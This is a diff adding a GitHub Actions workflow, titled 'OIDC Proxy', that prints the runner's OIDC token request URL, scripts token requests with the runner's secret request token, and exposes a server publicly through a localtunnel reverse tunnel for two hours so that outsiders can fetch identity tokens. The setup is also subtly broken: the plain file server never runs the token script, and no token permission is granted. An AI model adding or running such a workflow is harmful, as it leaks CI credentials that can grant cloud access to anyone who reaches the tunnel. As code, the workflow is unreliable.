@@ -1,0 +1,41 @@
+name: OIDC Proxy
+
+on: [workflow_dispatch]
+
+jobs:
+  proxy:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120 # Keep the session open
+
+    steps:
+      - name: Setup Interactive Proxy
+        env:
+          # These are injected automatically by GitHub Actions
+          ID_TOKEN_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
+          ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
+        run: |
+          echo "=== OIDC Proxy Active ==="
+          echo "Token Request URL: $ID_TOKEN_URL"
+          
+          # Create a simple HTTP server that exposes the OIDC endpoint
+          # This allows you to 'curl' the proxy from outside to get a fresh token
+          
+          # 1. Create a script that the runner will execute when requested
+          cat > /tmp/get_token.sh << 'EOF'
+          #!/bin/bash
+          # Use the runner's internal credentials to request a token
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          EOF
+          chmod +x /tmp/get_token.sh
+
+          # 2. Start a simple HTTP server on port 8080 to act as the proxy
+          # This server will return the result of the token request
+          python3 -m http.server 8080 --bind 0.0.0.0 &
+          
+          # 3. Start a reverse tunnel using a cloud service (e.g., ngrok or localtunnel)
+          # For this example, we'll use 'localtunnel' as it requires no API key
+          npm install -g localtunnel
+          lt --port 8080 --subdomain=github-oidc-proxy
+
+          # Keep the job alive
+          sleep 7200
